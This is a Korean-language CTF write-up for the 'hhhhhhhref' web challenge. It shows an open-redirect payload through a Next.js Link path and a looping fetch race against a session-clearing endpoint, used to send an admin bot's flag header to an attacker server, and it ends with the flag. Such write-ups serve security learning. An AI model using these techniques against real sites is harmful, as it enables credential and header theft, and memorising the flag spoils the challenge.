## hhhhhhhref

```javascript
await page.setExtraHTTPHeaders({
    "X-LINECTF-FLAG": process.env.FLAG
});
```
FLAG를 브라우저의 custom header로 설정하여 봇을 공격자의 서버로 접속시키는 것으로
플래그를 획득할 수 있습니다.

이를 위해 XSS 취약점 또는 Open redirection 취약점을 찾아야합니다.

```html
<Link
    href={{
        pathname: `/report/error/${props.errorCode}`,
    }}
    className="redirect_url"
    target="_blank"
>
    You are going to jump...
</Link>
```

[Link](https://nextjs.org/docs/pages/api-reference/components/link)

next.js의 link Component는 다른 경로로의 redirection을 위한 기능으로
errorCode에 `../../../../%09/example.com`을 전달할 경우 
페이지에 접속한 유저는 example.com으로 이동하게 됩니다.

```javascript
// are you USER?
if (userData.userRole === 'USER' && Object.keys(userData).length === 3) {
    return {
        redirect: {
            permanent: false,
            destination: '/error/403',
        },
        props: {},
    };
} else {
    return { props: { errorCode: errorCode } };
}

```

이를 사용하기 위해선 admin 권한을 획득하거나 reids 서버에 저장되는 user data의 길이가 3이 아니도록 설정해줘야 합니다.

```typescript
async function clear(req: any, res: any) {
    const session = await getServerSession(req, res, nextAuthOptions);

    if (!session) {
        return res.status(200).end();
    }

    if (!session.user) {
        return res.status(500).end();
    }

    const redis = new Redis(6379, 'redis');
    await redis.del(session.user.userId);
    redis.disconnect();
    return res.status(200).end();
}
```

이는 서버에서 redis에 user data를 저장할 때 사용하는 키가 유저마다 동일하다는 것을 활용하여 풀이할 수 있습니다.

공격자의 세션에서 `/api/auth/clear`에 지속적으로 요청을 보내고 동시에 bot에 crawling 요청을 보내면
bot이 rdr 경로에 접근하였을 때, redis에 저장된 userData가 삭제되어 봇이 공격자의 서버로 이동하게 됩니다.
이후 요청 헤더를 확인하면 플래그를 획득할 수 있습니다.

```
while (1) {
    await fetch('/api/auth/clear', { method: 'POST' });
}
```

```
LINECTF{7320a1b512380dd4e0452f9fc3166201}
```
